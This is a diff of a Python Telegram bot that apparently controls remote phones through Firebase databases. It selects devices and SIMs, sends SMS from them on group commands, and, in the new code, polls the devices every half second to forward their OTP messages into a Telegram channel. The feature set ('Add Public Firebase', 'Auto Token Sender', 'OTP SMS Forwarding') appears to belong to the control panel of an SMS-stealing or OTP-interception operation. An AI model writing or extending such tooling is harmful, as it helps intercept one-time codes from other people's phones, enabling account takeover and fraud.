+# ===== OTP CHANNEL HANDLERS =====
+async def awaiting_otp_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await require_access(update, context):
+        return ConversationHandler.END
+
+    text = (update.message.text or "").strip()
+    menu_buttons = {
+        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
+        "🔔 Start Reply", "🔔 Stop Reply",
+        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
+        "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
+        "🗑️ Delete Firebase", "📋 Select Firebase",
+        "➕ Add Group", "➖ Delete Group", "📋 Select Group", "🔙 Back",
+    }
+    if text in menu_buttons:
+        return await main_menu_handler(update, context)
+
+    user_id = update.effective_user.id
+    user_cfg = get_user_config(user_id)
+
+    channel_id = None
+    channel_title = ""
+
+    # Try to resolve channel
+    try:
+        if text.startswith("-100") or text.lstrip("-").isdigit():
+            chat = await context.bot.get_chat(int(text))
+            channel_id = chat.id
+            channel_title = chat.title or str(chat.id)
+        elif "t.me/" in text or text.startswith("@"):
+            chat = await context.bot.get_chat(text)
+            channel_id = chat.id
+            channel_title = chat.title or str(chat.id)
+        else:
+            # try as username
+            chat = await context.bot.get_chat(f"@{text.lstrip('@')}")
+            channel_id = chat.id
+            channel_title = chat.title or str(chat.id)
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ Could not join / find channel.\n\n"
+            f"Make sure:\n"
+            f"• Bot is already an <b>admin</b> in the channel\n"
+            f"• Link / username / ID is correct\n\n"
+            f"Error: {html.escape(str(e)[:120])}",
+            parse_mode=ParseMode.HTML,
+            reply_markup=get_main_keyboard(user_cfg)
+        )
+        return MAIN_MENU
+
+    if not channel_id:
+        await update.message.reply_text("❌ Failed to resolve channel.", reply_markup=get_main_keyboard(user_cfg))
+        return MAIN_MENU
+
+    user_cfg["otp_channel_id"] = channel_id
+    user_cfg["otp_channel_title"] = channel_title
+    save_user_config(user_id, user_cfg)
+
+    # Start monitoring if device already selected
+    if user_cfg.get("device_id"):
+        start_otp_monitoring(user_id, user_cfg)
+        extra = "\n\n✅ Device already selected → <b>OTP monitoring started</b>."
+    else:
+        extra = "\n\n💡 Now select a device with 📱 Device button."
+
+    await update.message.reply_text(
+        f"✅ <b>OTP Channel set successfully!</b>\n\n"
+        f"📢 Channel: <b>{html.escape(channel_title)}</b>\n"
+        f"🆔 ID: <code>{channel_id}</code>\n"
+        f"{extra}",
+        parse_mode=ParseMode.HTML,
+        reply_markup=get_main_keyboard(user_cfg)
+    )
+    return MAIN_MENU
+
+
+async def otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await require_access(update, context):
+        return
+    q = update.callback_query
+    await q.answer()
+    user_id = update.effective_user.id
+    user_cfg = get_user_config(user_id)
+    data = q.data or ""
+
+    if data == "otp_cancel":
+        await q.edit_message_text("Cancelled.")
+        return
+
+    if data == "otp_remove":
+        user_cfg["otp_channel_id"] = None
+        user_cfg["otp_channel_title"] = ""
+        user_cfg["otp_locked_messages"] = {}
+        user_cfg["otp_last_seen"] = {}
+        save_user_config(user_id, user_cfg)
+        stop_otp_monitoring(user_id)
+        await q.edit_message_text("✅ OTP Channel removed. Monitoring stopped.")
+        return
+
+    if data == "otp_update":
+        await q.edit_message_text(
+            "📨 Send the new channel link / @username / ID:\n\n"
+            "⚠️ Bot must be admin in the channel."
+        )
+        # We need to put user into AWAITING_OTP_CHANNEL state
+        # Since this is callback, we set a flag
+        context.user_data["awaiting_otp_update"] = True
+        return
+
+# ===================== FIREBASE ADD HANDLERS =====================
 async def add_public_firebase_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
         return ConversationHandler.END
@@ -1724,6 +2039,7 @@ async def add_public_firebase_handler(update: Update, context: ContextTypes.DEFA
 
     menu_buttons = {
         "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
         "🔔 Start Reply", "🔔 Stop Reply",
         "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
         "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
@@ -1761,6 +2077,7 @@ async def add_public_firebase_handler(update: Update, context: ContextTypes.DEFA
     await prompt_device_selection(update, context, user_cfg, msg_prefix=success_msg)
     return MAIN_MENU
 
+
 async def _save_private_firebase_and_prompt(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE,
@@ -1773,7 +2090,6 @@ async def _save_private_firebase_and_prompt(
     project_id: str = "",
     mode_label: str = "🔒 Private",
 ) -> int:
-    """Validate auth, save entry, notify, prompt devices. Returns next conversation state."""
     base = normalize_firebase_base(url)
     sec = clean_database_secret(secret) if secret else ""
     sa = service_account if isinstance(service_account, dict) else None
@@ -1792,7 +2108,6 @@ async def _save_private_firebase_and_prompt(
             f"(URL session me save hai — sirf secret/JSON bhejna kaafi hai)",
             parse_mode=ParseMode.HTML,
         )
-        # keep pending URL for retry
         context.user_data["pending_firebase_url"] = base
         return ADD_FIREBASE_SECRET
 
@@ -1828,6 +2143,7 @@ async def add_private_firebase_handler(update: Update, context: ContextTypes.DEF
 
     menu_buttons = {
         "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
         "🔔 Start Reply", "🔔 Stop Reply",
         "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
         "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
@@ -1842,9 +2158,7 @@ async def add_private_firebase_handler(update: Update, context: ContextTypes.DEF
     user_id = update.effective_user.id
     user_cfg = get_user_config(user_id)
 
-    # 1. Service Account .json (file or raw JSON text)
     json_data, json_err = await extract_json_from_message(update, context)
-    # only hard-fail JSON error if user clearly sent a document
     if json_err and msg and msg.document:
         await msg.reply_text(
             f"❌ {json_err}\n\n"
@@ -1860,7 +2174,6 @@ async def add_private_firebase_handler(update: Update, context: ContextTypes.DEF
             await msg.reply_text(sa_err or "❌ Invalid Service Account JSON.", parse_mode=ParseMode.MARKDOWN)
             return ADD_PRIVATE_FIREBASE
 
-        # if user already sent URL first, prefer that host (regional RTDB)
         pending = context.user_data.get("pending_firebase_url") or ""
         use_url = normalize_firebase_base(pending) if pending else default_url
         return await _save_private_firebase_and_prompt(
@@ -1871,7 +2184,6 @@ async def add_private_firebase_handler(update: Update, context: ContextTypes.DEF
             mode_label="🔒 Private (Service Account Key)",
         )
 
-    # 2. Text: URL (+ optional ?auth=SECRET) or bare secret while pending URL
     if not text:
         await msg.reply_text(
             "❌ Kuch bheja nahi.\n\n"
@@ -1881,10 +2193,8 @@ async def add_private_firebase_handler(update: Update, context: ContextTypes.DEF
         )
         return ADD_PRIVATE_FIREBASE
 
-    # If waiting for secret but user re-entered private flow with only secret text
     pending = context.user_data.get("pending_firebase_url")
     if pending and not validate_firebase_url(text) and not text.startswith("{"):
-        # treat as secret for pending URL
         return await _save_private_firebase_and_prompt(
             update, context, user_id, user_cfg,
             url=pending,
@@ -1905,7 +2215,6 @@ async def add_private_firebase_handler(update: Update, context: ContextTypes.DEF
     clean_url, secret = parse_firebase_input(text)
     secret = clean_database_secret(secret)
 
-    # URL already includes secret
     if secret:
         return await _save_private_firebase_and_prompt(
             update, context, user_id, user_cfg,
@@ -1914,7 +2223,6 @@ async def add_private_firebase_handler(update: Update, context: ContextTypes.DEF
             mode_label="🔒 Private (Database Secret)",
         )
 
-    # Ask for Database Secret next
     context.user_data["pending_firebase_url"] = clean_url
     back_kb = ReplyKeyboardMarkup(
         [[KeyboardButton("🔙 Back")]],
@@ -1942,6 +2250,7 @@ async def add_firebase_handler(update: Update, context: ContextTypes.DEFAULT_TYP
 
     menu_buttons = {
         "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
         "🔔 Start Reply", "🔔 Stop Reply",
         "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
         "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
@@ -1952,7 +2261,6 @@ async def add_firebase_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     if text in menu_buttons:
         return await main_menu_handler(update, context)
 
-    # Route to private handler if JSON file or has auth
     json_data, _ = await extract_json_from_message(update, context)
     if json_data or "?auth=" in text or "access_token=" in text:
         return await add_private_firebase_handler(update, context)
@@ -1960,7 +2268,6 @@ async def add_firebase_handler(update: Update, context: ContextTypes.DEFAULT_TYP
 
 
 async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Second step of private Firebase: plain Database Secret or Service Account JSON."""
     if not await require_access(update, context):
         return ConversationHandler.END
 
@@ -1969,6 +2276,7 @@ async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFA
 
     menu_buttons = {
         "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
         "🔔 Start Reply", "🔔 Stop Reply",
         "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
         "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
@@ -1982,7 +2290,6 @@ async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFA
 
     user_id = update.effective_user.id
     user_cfg = get_user_config(user_id)
-    # IMPORTANT: peek, do not pop until save succeeds (old bug: secret retry = session expired)
     url = context.user_data.get("pending_firebase_url")
 
     if not url:
@@ -1993,10 +2300,8 @@ async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFA
         )
         return MAIN_MENU
 
-    # Service Account JSON (file or paste)
     json_data, json_err = await extract_json_from_message(update, context)
     if json_err and msg and msg.document:
-        # keep pending URL — user can still send plain secret
         await msg.reply_text(
             f"❌ {json_err}\n\n"
             "Valid <code>.json</code> bhejein, ya Database Secret plain text me paste karein.",
@@ -2021,7 +2326,6 @@ async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFA
             mode_label="🔒 Private (Service Account Key)",
         )
 
-    # Plain-text Database Secret
     secret = clean_database_secret(text)
     if not secret:
         await msg.reply_text(
@@ -2030,15 +2334,12 @@ async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFA
         )
         return ADD_FIREBASE_SECRET
 
-    # If user re-pasted full URL?auth=secret on this step
     if secret.startswith("http://") or secret.startswith("https://") or "auth=" in text:
         clean_u, sec2 = parse_firebase_input(text)
         if sec2:
             context.user_data["pending_firebase_url"] = clean_u or url
             secret = sec2
             url = clean_u or url
-        elif validate_firebase_url(text) and not clean_database_secret(text).startswith("http"):
-            pass
 
     return await _save_private_firebase_and_prompt(
         update, context, user_id, user_cfg,
@@ -2047,15 +2348,16 @@ async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFA
         mode_label="🔒 Private (Database Secret)",
     )
 
+
 async def add_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
         return ConversationHandler.END
 
     text = (update.message.text or "").strip()
 
-    # If user pressed any menu / sub-menu button → execute that button's real function
     menu_buttons = {
         "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
         "🔔 Start Reply", "🔔 Stop Reply",
         "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
         "➕ Add Firebase", "🗑️ Delete Firebase", "📋 Select Firebase",
@@ -2069,7 +2371,6 @@ async def add_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_cfg = get_user_config(user_id)
     msg = update.message
 
-    # Forward detection
     target = None
     if msg.forward_origin and hasattr(msg.forward_origin, "chat"):
         target = msg.forward_origin.chat
@@ -2157,6 +2458,7 @@ async def add_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return MAIN_MENU
 
+
 async def awaiting_sim_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
         return ConversationHandler.END
@@ -2165,6 +2467,7 @@ async def awaiting_sim_handler(update: Update, context: ContextTypes.DEFAULT_TYP
 
     menu_buttons = {
         "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
         "🔔 Start Reply", "🔔 Stop Reply",
         "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
         "➕ Add Firebase", "🗑️ Delete Firebase", "📋 Select Firebase",
@@ -2192,6 +2495,7 @@ async def awaiting_sim_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         )
         return AWAITING_SIM
 
+
 async def awaiting_device_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
         return ConversationHandler.END
@@ -2199,6 +2503,7 @@ async def awaiting_device_handler(update: Update, context: ContextTypes.DEFAULT_
     text = (update.message.text or "").strip()
     menu_buttons = {
         "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+        "📨 OTP Channel",
         "🔔 Start Reply", "🔔 Stop Reply",
         "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
         "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
@@ -2216,11 +2521,17 @@ async def awaiting_device_handler(update: Update, context: ContextTypes.DEFAULT_
     save_user_config(user_id, user_cfg)
     data = get_device_data(user_cfg, did)
     sims = extract_sims(data) if data else []
+
+    # Start OTP monitoring if channel is set
+    if user_cfg.get("otp_channel_id"):
+        start_otp_monitoring(user_id, user_cfg)
+
     if len(sims) == 1:
         user_cfg["sim_index"] = sims[0]["index"]
         save_user_config(user_id, user_cfg)
         await update.message.reply_text(
-            f"✅ Device <code>{did}</code> + SIM {sims[0]['index']+1} set.",
+            f"✅ Device <code>{did}</code> + SIM {sims[0]['index']+1} set." +
+            ("\n📨 OTP monitoring started." if user_cfg.get("otp_channel_id") else ""),
             parse_mode=ParseMode.HTML,
             reply_markup=get_main_keyboard(user_cfg)
         )
@@ -2230,23 +2541,27 @@ async def awaiting_device_handler(update: Update, context: ContextTypes.DEFAULT_
         kb.append([InlineKeyboardButton("✏️ Manual", callback_data="free_sim_manual")])
         kb.append([InlineKeyboardButton("🔙 Skip", callback_data="free_sim_skip")])
         await update.message.reply_text(
-            f"✅ Device <code>{did}</code> set.\nSelect SIM:",
+            f"✅ Device <code>{did}</code> set.\nSelect SIM:" +
+            ("\n📨 OTP monitoring started." if user_cfg.get("otp_channel_id") else ""),
             parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup(kb)
         )
         return MAIN_MENU
     else:
         await update.message.reply_text(
-            f"✅ Device <code>{did}</code> saved.",
+            f"✅ Device <code>{did}</code> saved." +
+            ("\n📨 OTP monitoring started." if user_cfg.get("otp_channel_id") else ""),
             parse_mode=ParseMode.HTML,
             reply_markup=get_main_keyboard(user_cfg)
         )
         return MAIN_MENU
 
+
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_cfg = get_user_config(update.effective_user.id)
     await update.message.reply_text("Cancelled.", reply_markup=get_main_keyboard(user_cfg))
     return MAIN_MENU
+
 
 # ===================== CALLBACKS =====================
 async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2300,20 +2615,36 @@ async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _, did = data_s.split("|", 1)
     user_cfg["device_id"] = did
     save_user_config(user_id, user_cfg)
+
+    # Start OTP monitoring if channel is set
+    if user_cfg.get("otp_channel_id"):
+        start_otp_monitoring(user_id, user_cfg)
+
     data = get_device_data(user_cfg, did)
     if not data:
-        await q.edit_message_text(f"✅ Device `{did}` set (no SIM info).")
+        await q.edit_message_text(
+            f"✅ Device `{did}` set (no SIM info)." +
+            ("\n📨 OTP monitoring started." if user_cfg.get("otp_channel_id") else "")
+        )
         return
     sims = extract_sims(data)
     if len(sims) == 1:
         user_cfg["sim_index"] = sims[0]["index"]
         save_user_config(user_id, user_cfg)
-        await q.edit_message_text(f"✅ Device `{did}` + SIM {sims[0]['index']+1} set.")
+        await q.edit_message_text(
+            f"✅ Device `{did}` + SIM {sims[0]['index']+1} set." +
+            ("\n📨 OTP monitoring started." if user_cfg.get("otp_channel_id") else "")
+        )
     else:
         kb = [[InlineKeyboardButton(s["label"], callback_data=f"free_sim|{s['index']}")] for s in sims]
         kb.append([InlineKeyboardButton("✏️ Manual", callback_data="free_sim_manual")])
         kb.append([InlineKeyboardButton("🔙 Skip", callback_data="free_sim_skip")])
-        await q.edit_message_text(f"✅ Device `{did}` set.\nSelect SIM:", reply_markup=InlineKeyboardMarkup(kb))
+        await q.edit_message_text(
+            f"✅ Device `{did}` set.\nSelect SIM:" +
+            ("\n📨 OTP monitoring started." if user_cfg.get("otp_channel_id") else ""),
+            reply_markup=InlineKeyboardMarkup(kb)
+        )
+
 
 async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
@@ -2334,6 +2665,7 @@ async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_cfg["sim_index"] = int(idx)
     save_user_config(user_id, user_cfg)
     await q.edit_message_text(f"📶 SIM {int(idx)+1} selected.")
+
 
 async def firebase_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
@@ -2396,6 +2728,7 @@ async def firebase_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await q.edit_message_text(f"✅ Active:\n`{url}`{mode}", parse_mode=ParseMode.MARKDOWN)
             await prompt_device_selection(update, context, user_cfg)
 
+
 async def group_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
         return
@@ -2431,6 +2764,7 @@ async def group_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         title = get_group_title(user_cfg, gid)
         await q.edit_message_text(f"📌 `{title}` is monitored.\nID: `{gid}`", parse_mode=ParseMode.MARKDOWN)
 
+
 # ===================== AUTO CLEAN =====================
 async def on_my_chat_member(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = update.my_chat_member
@@ -2447,7 +2781,8 @@ async def on_my_chat_member(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.info(f"Bot left/kicked from {chat.title or gid}")
         remove_group_from_all_users(gid)
 
-# ===================== GROUP / CHANNEL MESSAGE =====================
+
+# ===================== GROUP / CHANNEL MESSAGE (outgoing SMS) =====================
 async def group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.effective_message
     if not msg:
@@ -2478,14 +2813,12 @@ async def group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not to_num or not sms:
         return
 
-    # Validate phone number on raw (un-escaped) value
     if not validate_phone_number(to_num):
         logger.info(f"   ❌ Invalid phone number: {to_num}")
         return
 
-    # Sanitize only for display/reply, not for the actual SMS payload
     to_num_display = html.escape(to_num)
-    sms_raw = sms  # send raw SMS text to Firebase
+    sms_raw = sms
 
     with cache_lock:
         user_ids = list(group_index.get(chat_id, set()))
@@ -2531,6 +2864,7 @@ async def group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         asyncio.create_task(_send())
 
+
 # ===================== ERROR =====================
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"Error: {context.error}", exc_info=context.error)
@@ -2538,14 +2872,8 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
 
 # ===================== LIVE RELOAD (panel → bot) =====================
 async def watch_panel_changes(context: ContextTypes.DEFAULT_TYPE):
-    """
-    Every few seconds: if settings.json / bot_data.db / .reload_flag changed,
-    reload config + user cache so panel edits apply without full restart
-    (BOT_TOKEN change still needs full process restart).
-    """
     global _settings_mtime, _db_mtime
     try:
-        # explicit flag from panel
         if os.path.isfile(RELOAD_FLAG):
             try:
                 os.remove(RELOAD_FLAG)
@@ -2640,6 +2968,10 @@ async def main():
                 MessageHandler(filters.TEXT & ~filters.COMMAND, awaiting_device_handler),
                 CommandHandler("start", start),
             ],
+            AWAITING_OTP_CHANNEL: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, awaiting_otp_channel_handler),
+                CommandHandler("start", start),
+            ],
         },
         fallbacks=[
             CommandHandler("cancel", cancel),
@@ -2663,6 +2995,7 @@ async def main():
     app.add_handler(CallbackQueryHandler(sim_callback, pattern=r"^free_sim"))
     app.add_handler(CallbackQueryHandler(firebase_callback, pattern=r"^(del_fb|confirm_del_fb|sel_fb)"))
     app.add_handler(CallbackQueryHandler(group_callback, pattern=r"^(remove_group|confirm_remove|sel_group|remove_cancel|sel_group_cancel)"))
+    app.add_handler(CallbackQueryHandler(otp_callback, pattern=r"^otp_"))
 
     app.add_handler(ChatMemberHandler(on_my_chat_member, ChatMemberHandler.MY_CHAT_MEMBER))
 
@@ -2674,14 +3007,6 @@ async def main():
         ),
         group_message
     ))
-    # Also handle caption-only messages (forwarded media with text)
-    # Panel live-reload watcher (settings.json + bot_data.db)
-    if app.job_queue:
-        app.job_queue.run_repeating(watch_panel_changes, interval=4, first=3)
-        logger.info("⏱️ Panel watch job registered (4s)")
-    else:
-        logger.warning("job_queue missing — install python-telegram-bot[job-queue] for live panel reload")
-
     app.add_handler(MessageHandler(
         filters.CAPTION & ~filters.COMMAND & (
             filters.ChatType.GROUPS
@@ -2691,12 +3016,21 @@ async def main():
         group_message
     ))
 
+    # Panel live-reload + high-frequency OTP monitor (near real-time)
+    if app.job_queue:
+        app.job_queue.run_repeating(watch_panel_changes, interval=4, first=3)
+        # 0.7s interval ≈ same responsiveness as the first bot's 0.5s tight loop
+        app.job_queue.run_repeating(otp_monitor_job, interval=0.5, first=3)
+        logger.info("⏱️ Panel watch + OTP monitor (0.5s) jobs registered — low latency mode")
+    else:
+        logger.warning("job_queue missing — install python-telegram-bot[job-queue] for live panel reload + OTP monitoring")
+
     app.add_error_handler(error_handler)
 
     await app.initialize()
     await app.start()
     await app.updater.start_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
-    logger.info("✅ Bot running (proper button handling inside Add Firebase / Add Group)")
+    logger.info("✅ Bot running (OTP SMS Forwarding enabled)")
 
     stop_event = asyncio.Event()
     loop = asyncio.get_running_loop()
